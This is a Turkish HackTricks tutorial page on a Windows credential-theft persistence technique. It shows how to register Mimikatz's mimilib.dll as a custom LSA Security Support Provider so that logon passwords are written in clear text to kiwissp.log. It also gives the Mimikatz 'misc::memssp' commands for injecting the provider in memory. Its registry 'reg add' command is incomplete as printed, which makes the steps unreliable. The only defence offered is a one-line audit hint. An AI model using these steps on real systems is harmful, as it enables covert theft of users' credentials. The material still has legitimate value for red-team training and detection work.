# Özel SSP

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

HackTricks'i desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
- 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
- **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

### Özel SSP

[SSP'nin (Güvenlik Destek Sağlayıcısı) ne olduğunu öğrenin.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan kimlik bilgilerini **açık metin** olarak **yakalamak** için **kendi SSP'nizi** oluşturabilirsiniz.

#### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini açık metin olarak bir dosyaya kaydeder.**\
Dll'yi `C:\Windows\System32\` dizinine bırakın\
Mevcut LSA Güvenlik Paketlerinin listesini alın:

{% code title="hedef@saldırgan" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Güvenlik Destek Sağlayıcı listesine (`Security Packages`) `mimilib.dll` dosyasını ekleyin:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve yeniden başlatma sonrasında tüm kimlik bilgileri açık metin olarak `C:\Windows\System32\kiwissp.log` dosyasında bulunabilir.

#### Bellekte

Ayrıca bunu doğrudan belleğe Mimikatz kullanarak enjekte edebilirsiniz (dikkat edin, biraz kararsız/çalışmayabilir):
```powershell
privilege::debug
misc::memssp
```
Bu yeniden başlatmaları sağlamaz.

#### Hafifletme

Olay Kimliği 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturulması/değiştirilmesi denetimi

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.** takip edin
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
